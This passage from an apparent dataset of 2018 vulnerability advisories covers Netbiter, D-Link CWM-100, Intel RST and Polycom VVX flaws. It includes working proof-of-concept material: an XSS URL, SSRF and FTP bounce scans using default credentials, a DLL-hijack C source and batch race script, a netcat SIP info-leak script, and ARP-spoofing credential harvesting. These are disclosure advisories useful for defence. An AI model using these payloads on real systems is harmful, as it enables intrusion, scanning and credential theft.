port 80/tcp and 443/tcp using a firewall.
Acknowledgments
---------------
We thank Siemens for the coordinated disclosure.
Timeline
--------
2018-05-28: Vulnerability discovered by Emanuel Duss and Nicolas Heiniger
2018-05-28: Informed customer
2018-06-06: Initial vendor notification
2018-03-18: Vendor informed us that they will publish an advisory
2019-01-08: Siemens published advisory [3]
2019-01-11: Compass published advisory containing technical information
References
----------
[1] https://w3.siemens.com/smartgrid/global/en/products-systems-solutions/substation-automation/substation-automation/pages/sicam-a8000.aspx
[2] https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Billion_Laughs
[3] https://cert-portal.siemens.com/productcert/txt/ssa-579309.txt"
687,[SYSS-2018-042] XSS in HMS Netbiter WS100 - CVE-2018-19694,,CVE-2018-19694,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Advisory ID: SYSS-2018-042
Product: Netbiter WS100
Manufacturer: HMS Industrial Networks AB
Affected Version(s): 3.30.5 <=
Tested Version(s): 3.30.5
Vulnerability Type: Cross-Site Scripting (CWE-79)
Risk Level: Low
Solution Status: Fixed
Manufacturer Notification: 2018-11-29
Solution Date: 2018-12-20
Public Disclosure: 2019-01-11
CVE Reference: CVE-2018-19694
Authors of Advisory: Micha Borrmann (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Netbiter WS100 is a remote management solution for industrial control
(e.g. emergency generators) (see [1]).
Due to improper input validation, the web-based remote management
solution is vulnerable to reflected cross-site scripting attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The login form reflects values from parameters without any kind of
filtering or escaping.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The following attack vector exemplarily demonstrates the described
reflected cross-site scripting vulnerability:
http://$TARGET/cgi-bin/write.cgi?page=%22;document.write(%27%3Ch1%3EXSS%20Demonstration%3C/h1%3E%27)//
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Install the provided security patch (see [2]).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-11-29: Detection of the vulnerability
2018-11-29: CVE number assigned
2018-12-03: Vulnerability reported to manufacturer
2018-12-20: Security patch was released from the vendor
2019-01-11: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product web site
https://www.netbiter.com/support/file-doc-downloads/netbiter-ws100
[2] HMS Security Advisory Report HMSSAR-2018-12-04-001
https://www.hms-networks.com/docs/librariesprovider6/cybersecurity/hms-security-advisory-2018-12-04-001-ec150-ec250-lc310-lc350-ws100-ws200-cve-2018-19694.pdf
[3] SySS Security Advisory SYSS-2018-042
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-042.txt
[4] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Micha Borrmann of SySS GmbH.
E-Mail: micha.borrmann (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Micha_Borrmann.asc
Key Fingerprint: F2E7 C6A5 9950 84ED 7AD6 0DD4 EDBE 26E7 14EA 5876
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory
may be updated in order to provide as accurate information as
possible. The latest version of this security advisory is available on
the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCAAdFiEE8ufGpZlQhO161g3U7b4m5xTqWHYFAlw4ozcACgkQ7b4m5xTq
WHbO4g//eCR/3uDF5Kr8G5Iybj8SkDbZVtkvvgX6E4NWKUEYC43F2buLtDqeei7k
CiELScdzz7n0SDhmbZLG9NT5Luo9Uu62bDfVejm9c6zLug0VftvX280HyPK51oxf
c3lX7mo5ZClq+Uj0UW/Pr4yZHhTEipySpRAOa1IM2VQqSN2tGThD/IOycZa3FmaL
qk5h+H+hIZKBhFGuowFhNULouP076l6ib66K/v6yXTO6BkcHNiHToUAWkoRuQ0rB
LEikXeAZqmv7DfKRwLhGJWzga4YDOQN0BCoVDtEzgpgf3ogyvwNMKnq5WxylfLn/
T2q8w4jvCmoPtQPRtW1IHGloMngso9O1bXBKzLAbS4EP/RJYzI8iazKVr7x9gpv0
7bw9+lQ9McMLLAiGgkJgMcWOjtaZpB+T5XegVbTjk/4g3kP6XCY8ZA4cvqxQ/QM5
4X5m5bk48ZW/agIqB+a8LzQdtQhFhITZ62eLO13Qmq7vEdIhTx6I1LmIIcICelyQ
pY0aRtMcXePGZOSiO/gqO50L1giA4BjwUOtSekvpt0XP/D4thruUajEK+4hnvazP
eX9bzseBj5gkaYGEBkj3adKK/AK9GALCwhj4UMvSlUA7uhMRUDZxErCZwUrVt9xB
TM0wQddZ5TFCWy22WONVd2+I53WqU+FZbP/Ygv+S0o22nHM++4E=
=TBoG
-----END PGP SIGNATURE-----"
766,D-LINK Central WifiManager CWM-100 Server Side Request Forgery CVE-2018-15517,,CVE-2018-15517,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/DLINK-CENTRAL-WIFI-MANAGER-CWM-100-SERVER-SIDE-REQUEST-FORGERY.txt
[+] ISR: ApparitionSec
***Greetz: indoushka | Eduardo B.***
[Vendor]
us.dlink.com
[Product]
D-LINK Central WifiManager (CWM 100)
Version 1.03 r0098
http://us.dlink.com/products/business-solutions/central-wifimanager-software-controller/
D-Link�s free Central WiFiManager is a web-based wireless Access Point management tool, enabling you to create and manage multi-site, multi-tenancy wireless networks.
[Vulnerability Type]
Server Side Request Forgery
[Affected Component]
MailConnect
[CVE Reference]
CVE-2018-15517
[Security Issue]
Using a web browser or script SSRF can be initiated against internal/external systems to conduct port scans by leveraging D-LINKs MailConnect component.
The MailConnect feature on D-Link Central WiFiManager CWM-100 1.03 r0098 devices is intended to check a connection to an SMTP server but actually allows
outbound TCP to any port on any IP address, leading to SSRF, as demonstrated by an index.php/System/MailConnect/host/127.0.0.1/port/22/secure/ URI.
This can undermine accountability of where scan or connections actually came from and or bypass the FW etc. This can be automated via script or using Web Browser.
[Exploit/POC]
https://VICTIM-IP/index.php/System/MailConnect/host/port/secure/
reply: OK
Scan internal port 22 SSH:
https://VICTIM-IP/index.php/System/MailConnect/host/VICTIM-IP/port/22/secure/
reply: OK
[Network Access]
Remote
[Severity]
Medium
[Disclosure Timeline]
Vendor Notification: August 8, 2018
Vendor acknowledgement: August 8, 2018
CVE assigned Mitre: August 18, 2018
Request update: August 31, 2018
No reply from vendor
Request update: September 6, 2018
Vendor: ""R&D has begun this month to patch your report."" : September 12, 2018
Request update: October 3, 2018
Vendor: ""will release a new beta for QA verification by end of this month 10'2018.""
Request update: October 16, 2018
no reply from vendor
Request update: October 23, 2018
Vendor: ""It still is schedule to be released by the 31st."" : October 23, 2018
Inform vendor of disclosure by November 8, 2018 : October 31, 2018
No reply from vendor
November 8, 2018 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
767,D-LINK Central WifiManager CWM-100 Trojan File SYSTEM Privilege Escalation CVE-2018-15515,,CVE-2018-15515,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/DLINK-CENTRAL-WIFI-MANAGER-CWM-100-SYSTEM-PRIVILEGE-ESCALATION.txt
[+] ISR: ApparitionSec
***Greetz: indoushka | Eduardo B.***
[Vendor]
us.dlink.com
[Product]
D-LINK Central WifiManager (CWM 100)
Version 1.03 r0098
http://us.dlink.com/products/business-solutions/central-wifimanager-software-controller/
D-Link�s free Central WiFiManager is a web-based wireless Access Point management tool, enabling you to create and manage multi-site, multi-tenancy wireless networks.
[Vulnerability Type]
Trojan File SYSTEM Privilege Escalation
[Affected Component]
""quserex.dll""
[CVE Reference]
CVE-2018-15515
[Security Issue]
D-Link Central WiFiManager CWM-100 1.03 r0098 devices will load a Trojan horse ""quserex.dll"" and will create a new thread running with SYSTEM integrity.
[Impact]
Code Execution as SYSTEM
[Exploit/POC]
1) Create 32bit DLL named ""quserex.dll"" and place in ""CaptivelPortal.exe"" directory under the DLINK directory
2) Restart the service ""CaptivelPortal""
3) Proof, examine using process monitor (sysinternals)
#include <windows.h>
/* hyp3rlinx */
/*
gcc -c -m32 quserex.c
gcc -shared -m32 -o quserex.dll quserex.o
*/
void executo(){
MessageBox(NULL, ""Enjoy ur SYSTEM Integrity!"", "":)"", MB_OK);
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
switch(fdwReason){
case DLL_PROCESS_ATTACH:{
executo();
break;
}
case DLL_PROCESS_DETACH:{
executo();
break;
}
case DLL_THREAD_ATTACH:{
executo();
break;
}
case DLL_THREAD_DETACH:{
executo();
break;
}
}
return TRUE;
}
[Network Access]
Local
[Severity]
High
[Disclosure Timeline]
Vendor Notification: August 8, 2018
Vendor acknowledgement: August 8, 2018
CVE assigned Mitre: August 18, 2018
Request update: August 31, 2018
No reply from vendor
Request update: September 6, 2018
Vendor: ""R&D has begun this month to patch your report."" : September 12, 2018
Request update: October 3, 2018
Vendor: ""will release a new beta for QA verification by end of this month 10'2018.""
Request update: October 16, 2018
no reply from vendor
Request update: October 23, 2018
Vendor: ""It still is schedule to be released by the 31st."" : October 23, 2018
Inform vendor of disclosure by November 8, 2018 : October 31, 2018
No reply from vendor
November 8, 2018 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
768,D-LINK Central WifiManager CWM-100 FTP Server PORT Bounce Scan CVE-2018-15516,,CVE-2018-15516,"[+] Credits: John Page (aka hyp3rlinx)
[+] Website: hyp3rlinx.altervista.org
[+] Source: http://hyp3rlinx.altervista.org/advisories/DLINK-CENTRAL-WIFI-MANAGER-CWM-100-FTP-SERVER-PORT-BOUNCE-SCAN.txt
[+] ISR: ApparitionSec
***Greetz: indoushka | Eduardo B.***
[Vendor]
us.dlink.com
[Product]
D-LINK Central WifiManager (CWM 100)
Version 1.03 r0098
http://us.dlink.com/products/business-solutions/central-wifimanager-software-controller/
D-Link�s free Central WiFiManager is a web-based wireless Access Point management tool, enabling you to create and manage multi-site, multi-tenancy wireless networks.
[Vulnerability Type]
FTP Server PORT Bounce Scan
[CVE Reference]
CVE-2018-15516
[Security Issue]
The FTP Server component of the D-LINK Central WifiManager can be used as a man-in-the-middle machine allowing PORT Command bounce scan attacks.
This vulnerability allows remote attackers to abuse your network and discreetly conduct network port scanning. Victims will then think these
scans are originating from the D-LINK network running the afflicted FTP Server and not you.
[Exploit/POC]
D-LINK CWM-100 FTP Server listens on port 9000 (default), default creds are ""admin"" ""admin""
nmap -v -b admin:admin@VICTIM-IP:9000 <TARGET-IP> -p 21,22,23,53,445
[POC Video URL]
https://vimeo.com/299797225
[Network Access]
Remote
[Severity]
Medium
[Disclosure Timeline]
Vendor Notification: August 8, 2018
Vendor acknowledgement: August 8, 2018
CVE assigned Mitre: August 18, 2018
Request update: August 31, 2018
No reply from vendor
Request update: September 6, 2018
Vendor: ""R&D has begun this month to patch your report."" : September 12, 2018
Request update: October 3, 2018
Vendor: ""will release a new beta for QA verification by end of this month 10'2018.""
Request update: October 16, 2018
no reply from vendor
Request update: October 23, 2018
Vendor: ""It still is schedule to be released by the 31st."" : October 23, 2018
Inform vendor of disclosure by November 8, 2018 : October 31, 2018
No reply from vendor
November 8, 2018 : Public Disclosure
[+] Disclaimer
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).
hyp3rlinx"
769,[CVE-2018-3635] Executable installers are vulnerable^WEVIL (case 59): arbitrary code execution WITH escalation of privilege via Intel Rapid Storage Technology User Interface and Driver,,CVE-2018-3635,"Hi @ll,
the executable installer of the
Intelï¿½ Rapid Storage Technology (Intelï¿½ RST) User Interface and Driver,
version 15.9.0.1015 (LATEST for Windows 7), released 11/14/2017, available
from <https://downloadmirror.intel.com/27400/eng/SetupRST.exe> via
<https://downloadcenter.intel.com/download/27400/Intel-Rapid-Storage-Technology-Intel-RST-User-Interface-and-Driver>
is (SURPRISE!) vulnerable!
CVSS score: 7.5/HIGH CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
See Intel's security advisory SA-00153
<https://www.intel.com/content/www/us/en/security-center/advisory/INTEL-SA-00153.html>
Vulnerability #1:
=================
Although running with ELEVATED (administrative) privileges
(the ""application manifest"" embedded in SetupRST.exe specifies
""requireAdministrator""), on STANDARD installations of Windows,
i.e. where the user account created during Windows setup is used,
the executable installer creates an UNPROTECTED subdirectory
IIF<abcd>.tmp in the user's %TEMP% directory.
For this well-known and well-documented vulnerability see
<https://cwe.mitre.org/data/definitions/377.html> and
<https://cwe.mitre.org/data/definitions/379.html> plus
<https://capec.mitre.org/data/definitions/29.html>
The subdirectory IIF<abcd>.tmp inherits the NTFS ACLs from its
parent %TEMP%, allowing ""full access"" for the unprivileged
(owning) user, who can replace/overwrite the DLLs
%TEMP%IIF<abcd>.tmpResource.dll
%TEMP%IIF<abcd>.tmp??-??IntelCommon.dll
later loaded and executed by the installer between their creation
and use.
Since these DLLs are executed with administrative privileges, this
vulnerability results in arbitrary code execution WITH escalation
of privilege.
NOTE: the precondition ""user account created during Windows setup""
is met on typical installations of Windows: according to
Microsoft's own security intelligence reports, about 1/2 to
3/4 of the about 600 million Windows installations which send
telemetry data have only ONE active user account.
<https://www.microsoft.com/security/sir>
Demonstration/proof of concept:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. visit <https://skanthak.homepage.t-online.de/sentinel.html>,
then download
<https://skanthak.homepage.t-online.de/skanthak/download/SENTINEL.DLL>
and save it in an arbitrary directory;
2. save the following batch script in the same directory:
--- IIF.CMD ---
:WAIT
@If Not Exist ""%TEMP%IIF????.tmp"" Goto :WAIT
For /D %%! In (""%TEMP%IIF????.tmp"") Do Set IIFTMP=%%!
Copy /Y SENTINEL.DLL ""%IIFTMP%Resource.dll""
For /R ""%IIFTMP%"" %%! In (IntelCommon.dll) Do Copy /Y SENTINEL.DLL ""%%!""
Set IIFTMP=
--- EOF ---
3. start the batch script per double-click;
4. execute SetupRST.exe: notice the message boxes displayed from
the replaced DLLs.
Fixes:
~~~~~~
1. ALWAYS specify a PROPER ""security descriptor"" when you create
(temporary) files or directories in potentially unsafe (i.e.
user-writable) paths like the %TEMP% directory!
See <https://msdn.microsoft.com/en-us/library/aa363855.aspx>
and use the second parameter of CreateDirectory() to properly
restrict the permissions when running elevated!
2. NEVER load resource(-only) DLLs for execution!
See <https://msdn.microsoft.com/en-us/library/ms684179.aspx>
and use the third parameter of LoadLibraryEx() to specify
LOAD_LIBRARY_AS_DATAFILE or LOAD_LIBRARY_AS_IMAGE_RESOURCE
Mitigations:
~~~~~~~~~~~~
1. DONT use executable installers; stay far away from such
eternally vulnerable crap!
2. NEVER run executable installers in unsafe environments,
especially NEVER from UNSAFE directories like ""%TEMP%"" or
""%USERPROFILE%Downloads""
3. DISABLE execution of files (via NTFS ACL, as shown below) in
the systems and every users %TEMP% and every %USERPROFILE%
(see <https://skanthak.homepage.t-online.de/SAFER.html>)!
4. Practice STRICT privilege separation: use a your privileged
""Administrator"" account (especially the account created during
Windows setup) ONLY for administrative tasks, and COMPLETELY
separate unprivileged user accounts, with elevation requests
DISABLED, for your everyday/regular work.
Vulnerability #2:
=================
A variant of #1, resulting in denial of service.
Demonstration/proof of concept:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
1. add the NTFS access control list entry (D;OIIO;WP;;;WD) meaning
""deny execution of files in this directory for everyone,
inheritable to all subdirectories"" to the (user's) %TEMP%
directory.
NOTE: this does NOT need administrative privileges!
2. execute SetupRST.exe: notice the message box
""error loading language resource"" displayed.
Fix:
~~~~
Create (temporary) files and directories with PROPER permissions!
See above.
stay tuned
Stefan Kanthak
Timeline:
~~~~~~~~~
2018-06-06 vulnerability report sent to vendor
2018-06-10 Intel acknowledges receipt
2018-06-14 Intel confirms reported vulnerability
2018-10-26 CVE-2018-3635 assigned
2018-11-13 Intel publishes security advisory SA-00153
2018-11-16 vulnerability report published"
819,"[SYSS-2018-028] information leakage with Polycom VVX Phones (Skype for Business, on-premise) - CVE-2018-18566",,CVE-2018-18566,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Advisory ID: SYSS-2018-028
Product: VVX 500 / VVX 601
Manufacturer: Polycom
Affected Version(s): <= 5.8.0.12848
Tested Version(s): 5.4.0.10182, 5.8.0.12848
Vulnerability Type: Information Exposure (CWE-200)
Risk Level: Low
Solution Status: Open
Manufacturer Notification: 2018-08-29
Solution Date: 20??-??-??
Public Disclosure: 2018-10-23
CVE Reference: CVE-2018-18566
Authors of Advisory: Micha Borrmann (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
If a Polycom VVX 500/601 [1] is used with an on-premise installation
with Skype for Business, the phone leaks the configured phone number
and the name to unauthorized clients via SIP.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The phone has a SIP service running by default on TCP port 5060. This
service can be abused to leak information about the configuration of
the phone.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Script getdatafrompolycom.sh
#!/bin/sh
# Micha Borrmann <micha.borrmann syss de>
OWNIP=192.168.100.102
if [ -z ""$1"" ]
then
echo ""Please enter an IPv4 address as target""
exit
else
TARGET=$1
fi
echo 'OPTIONS sip:dummy SIP/2.0
Via: SIP/2.0/TCP '$OWNIP':5060
To: <sip:'$OWNIP':5060>
From: <sip:127.0.0.1:5060>
Call-ID: 1
CSeq: 1 OPTIONS
Contact: <sip:127.0.0.1:5060>
Accept: application/sdp
Content-Length: 0
' | recode ..ibmpc | netcat -w 1 $TARGET 5060
Start the script against a phone and see the result:
$ ./getpolycom.sh 192.168.100.101
SIP/2.0 200 OK
Via: SIP/2.0/TCP 192.168.100.102:5060
From: <sip:127.0.0.1:5060>
To: ""Micha Borrmann"" <sip:192.168.100.102:5060>;tag=F75D6627-FE135FAE
CSeq: 1 OPTIONS
Call-ID: 1
Contact: <sip:micha.borrmann example com;opaque=user:epid:XYZ...;abcd>
Allow: INVITE,ACK,BYE,CANCEL,OPTIONS,INFO,MESSAGE,SUBSCRIBE,NOTIFY,PRACK,UPDATE,REFER
Supported: replaces,100rel
User-Agent: Polycom/5.8.0.12848 PolycomVVX-VVX_601-UA/5.8.0.12848
Accept-Language: en
P-Preferred-Identity: ""Micha Borrmann"" <sip:micha.borrmann example com>,<tel:+49XYZ334455661234;ext=1234>
Accept: application/sdp,text/plain,message/sipfrag,application/dialog-info+xml
Accept-Encoding: identity
Supported: 100rel,replaces,norefersub,sdp-anat
Authorization: NTLM qop=""auth"", realm=""SIP Communications Service"", opaque=""1234CAFE"", crand=""cafe1234"", cnum=""11"", targetname=""server.example.com"", response=""0000000000000000000000000001""
Content-Length: 0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Install the new firmware which has disabled the SIP service by default.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-08-13: Detection of the vulnerability
2018-08-29: Vulnerability reported to manufacturer
2018-10-22: CVE number assigned
2018-10-23: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product web sites for the phones
https://support.polycom.com/content/support/emea/emea/en/support/voice/business-media-phones/vvx500.html
https://support.polycom.com/content/support/emea/emea/en/support/voice/business-media-phones/vvx601.html
[2] SySS Security Advisory SYSS-2018-028
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-028.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Micha Borrmann of SySS GmbH.
E-Mail: micha.borrmann (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Micha_Borrmann.asc
Key Fingerprint: F2E7 C6A5 9950 84ED 7AD6 0DD4 EDBE 26E7 14EA 5876
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory
may be updated in order to provide as accurate information as
possible. The latest version of this security advisory is available on
the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCAAdFiEE8ufGpZlQhO161g3U7b4m5xTqWHYFAlvO5bkACgkQ7b4m5xTq
WHZWBg//eaZW/155/oKVQ5bH8jZ8bPpfe2mbETZ1xU4df60IG16g8/Tz61TEcAu7
N9q3XtdR389shVEG+EQ2Fg9EA5loVX1MMAT3YvaITJbMoRSmX53Sa68mUaPBMWAl
KZQKJD0kFlywsPL25BUQoJVVjvV+y3X45opRQ6u+wf4j5zdrS381CXG1zo4i5YWz
ENHv8uKrcgfTkGpejb61+dAH3K4VssjDNES3kvv1EfCQzOPY8TfTOGQ4MrRPwnZo
p2cfNjIUwKfkqEbNVA/WSiSNOSM12H9DgxzzZI/QxRS76d2pNtWBARVwxArS/DPK
A/lyFswBBCP2timeq+94FC0pXSfCNZazgD4O/pcLXVMis3FiTiJOdRyVrX8pYdr+
Pe+qsve/m+r0fO6dmOimIzx7I/GIT6ARYqJ5cbXdtDDGKAUpNjKixZxjPnBjWst4
tuVHn6PINzPmvGxBcZu4i8VxUPsTXMl992xz/3JDNtIy6sklfwhAN1wdJqLjB4yW
XkirVDdS1aTkLyrs+P19XGDwq+aE19K0PksA1aglv5Ha3VxJWqiaYVOSeFpE+/Ur
jpzNmDtbr8FTq9G1JYgstcCvEv325gd11zvCMsG23cgIBLFqi8r7VWqXGuABPI/b
/upHU1fv2sZe8PHexfFuyO7f0w1LGDrcL+IXoLyDKRVNc3joC7c=
=dxlv
-----END PGP SIGNATURE-----"
820,"[SYSS-2018-027] missing X.509 validation with Polycom VVX Phones (Skype for Business, on-premise) - CVE-2018-18568",,CVE-2018-18568,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Advisory ID: SYSS-2018-027
Product: VVX 500 / VVX 601
Manufacturer: Polycom
Affected Version(s): <= 5.8.0.12848
Tested Version(s): 5.4.0.10182, 5.8.0.12848
Vulnerability Type: X.509 validation - Man-in-the-Middle (CWE-300)
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2018-08-29
Solution Date: 20??-??-??
Public Disclosure: 2018-10-23
CVE Reference: CVE-2018-18568
Author of Advisory: Micha Borrmann (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
If a Polycom VVX 500/601 [1] is used with an on-premise installation
with Skype for Business, the phone has stored credentials of an
account in the active directory. Performing a man-in-the-middle
attack, the phone give the credentials to an attacker and therefore
the account will be compromised.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The phone sends the stored credentials to a website usually named
autodiscover via HTTPS, but no X.509 certificate validation is used.
The credentials are sent with the challenge-response NetNTLM
algorithm. Performing a downgrade attack to HTTP basic authentication,
the credentials can be harvested Base64 encoded.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
Using Burp Suite as invisible proxy.
Perform an ARP spoofing attack against the phone that the data traffic
is going the the device were the Burp Suite is running. All attacks
are started from the same device.
# arpspoof -i eth0 -t 192.168.100.101 192.168.100.1
Set an iptables rule, that the traffic is sent to the Burp Suite, like
# iptables -A PREROUTING -t nat -i eth0 -s 192.168.100.101 -p tcp --dport 443 -j REDIRECT --to-port 8080
Enable rules with the Burp Suite to suppress these two response headers:
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
Now, an authentication downgrade attack is in place, too.
Watch the proxy history for a HTTP POST request like
POST /autodiscover/autodiscover.xml HTTP/1.1
Content-Type: text/xml; charset=utf-8
Content-Length: 454
Connection: close
Accept-Encoding: gzip, deflate
Accept-Language: en,*
User-Agent: Mozilla/5.0
Host: autodiscover.example.com
Authorization: Basic ZXhhbXBsZVxBRGFjY291bnRuYW1lOnZlcnl0b3BzZWNyZXRwYXNzd29yZA==
Decode the harvested Base64 encoded credential information.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
Install the new firmware, which has a trust store integrated and a
strict X.509 certificate validation policy, too.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-08-13: Detection of the vulnerability
2018-08-29: Vulnerability reported to manufacturer
2018-10-22: CVE number assigned
2018-10-23: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product web sites for the phones
https://support.polycom.com/content/support/emea/emea/en/support/voice/business-media-phones/vvx500.html
https://support.polycom.com/content/support/emea/emea/en/support/voice/business-media-phones/vvx601.html
[2] SySS Security Advisory SYSS-2018-027
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-027.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Micha Borrmann of SySS GmbH.
E-Mail: micha.borrmann (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Micha_Borrmann.asc
Key Fingerprint: F2E7 C6A5 9950 84ED 7AD6 0DD4 EDBE 26E7 14EA 5876
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory
may be updated in order to provide as accurate information as
possible. The latest version of this security advisory is available on
the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
